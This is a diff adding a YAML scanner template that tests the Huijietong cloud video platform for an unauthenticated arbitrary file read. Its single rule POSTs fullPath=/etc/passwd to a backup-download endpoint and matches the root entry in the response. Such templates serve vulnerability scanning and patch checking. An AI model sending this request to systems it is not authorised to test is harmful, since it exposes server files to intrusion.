@@ -1,0 +1,11 @@
+name: poc-yaml-huijietong-cloud-video-platform-fileread
+rules:
+  - method: POST
+    path: /fileDownload?action=downloadBackupFile
+    body: fullPath=/etc/passwd
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+    - http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF%E5%B9%B3%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
